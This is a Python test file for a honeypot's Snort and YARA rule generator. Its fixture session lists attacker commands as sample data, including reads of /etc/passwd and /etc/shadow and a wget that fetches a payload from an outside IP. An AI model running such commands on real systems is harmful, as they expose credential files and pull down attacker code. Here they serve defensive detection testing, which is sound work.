from pathlib import Path

from rules.generator import RuleGenerator, SessionSummary, SidAllocator


def _session(**overrides):
    data = {
        "timestamp": "2026-05-05T10:00:00Z",
        "session_id": "sess-rule",
        "attacker_ip": "172.18.0.5",
        "service": "ssh",
        "session_duration": 60.0,
        "login_attempts": 5,
        "login_success": True,
        "commands": [
            "cat /etc/passwd",
            "cat /etc/shadow",
            "uname -a",
            "netstat -tulnp",
            "wget http://203.0.113.10/payload -O /tmp/p",
        ],
        "command_count": 5,
        "unique_commands": 5,
        "files_downloaded": [],
        "file_hashes": [],
        "brute_force_detected": True,
        "ttp_count": 4,
        "usernames_tried": ["root", "admin"],
        "session_start": "2026-05-05T09:59:00Z",
        "session_end": "2026-05-05T10:00:00Z",
    }
    data.update(overrides)
    return SessionSummary(**data)


def test_sid_allocator_starts_after_existing_files(tmp_path: Path):
    output_dir = tmp_path / "rules"
    output_dir.mkdir(parents=True)
    (output_dir / "seed.rules").write_text("alert tcp any any -> any 22 (sid:9000005;)\n")

    allocator = SidAllocator(output_root=tmp_path, ssh_base=9000001, web_base=9001001, db_base=9002001)
    assert allocator.next_sid("ssh") == 9000006


def test_rule_generator_outputs_non_noisy_rules(tmp_path: Path):
    allocator = SidAllocator(
        output_root=tmp_path,
        ssh_base=9000001,
        web_base=9001001,
        db_base=9002001,
    )
    generator = RuleGenerator(sid_allocator=allocator)

    record = generator.generate(_session())

    assert record["rule_count"] >= 4
    assert any("brute force" in rule for rule in record["snort_rules"])
    assert any("shadow file access" in rule for rule in record["snort_rules"])
    assert any("network reconnaissance" in rule for rule in record["snort_rules"])
    assert "rule Honeypot_Session_" in record["yara_rules"][0]
    assert "T1105" in record["ttps_captured"]
